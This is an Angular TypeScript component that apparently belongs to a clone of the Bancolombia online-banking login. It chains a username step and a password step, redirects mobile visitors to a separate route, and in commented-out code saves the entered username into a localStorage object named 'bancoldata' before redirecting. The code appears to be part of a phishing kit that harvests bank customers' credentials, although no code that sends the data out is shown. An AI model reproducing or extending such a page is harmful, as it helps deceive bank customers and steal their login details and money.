import { CommonModule } from '@angular/common';
import { AfterViewInit, Component, ElementRef, QueryList, Renderer2, ViewChild, ViewChildren } from '@angular/core';
import { FormsModule, ReactiveFormsModule } from '@angular/forms';
import { Router, RouterLink } from '@angular/router';
import BancolombiaUserComponent from "../../shared/bancolombiaUser/bancolombiaUser.component";
import BancolombiaPassComponent from "../../shared/bancolombiaPass/bancolombiaPass.component";

@Component({
  selector: 'app-bancolombia',
  imports: [CommonModule, FormsModule, BancolombiaUserComponent, BancolombiaPassComponent],
  templateUrl: './bancolombia.component.html',
  styleUrl: './bancolombia.component.css'
})
export default class BancolombiaComponent implements AfterViewInit {
  @ViewChild('userInput') userInput!: ElementRef;
  @ViewChild('continueButton') continueButton!: ElementRef;
  @ViewChild('imageContainer') imageContainer!: ElementRef;
  @ViewChild('loader') loader!: ElementRef;

  page = 1;
  user: string = "";
  constructor(private renderer: Renderer2, private router: Router) {}

  ngAfterViewInit(): void {
    if (window.innerWidth <= 800) {
      this.router.navigate(['bancolombia-movil']);
    }
  }

    // Action when clicking "Continue"
    /* this.renderer.listen(continueButtonElement, 'click', () => {
      const userValue = userInputElement.value.trim();
      if (userValue.length >= 4) {
        let bancoldata: any;
        try {
          const storedData = localStorage.getItem('bancoldata');
          bancoldata = storedData ? JSON.parse(storedData) : {};
        } catch (e) {
          console.error('Error al parsear bancoldata. Reiniciando a un objeto vacío:', e);
          bancoldata = {};  */

        // Update the object with the new user value
        //bancoldata.usuario = userValue;

        // Save the updated value to localStorage
        //localStorage.setItem('bancoldata', JSON.stringify(bancoldata));

        // Redirect to the next page
        //window.location.href = 'index-cel.html';
/*       } else {
        alert('Por favor, ingrese un usuario válido de al menos 4 caracteres.');
      } */


    // Handle password input fields and continue button
    // (same logic as before)

  nextpage() {
    this.page = 2;
  }
}
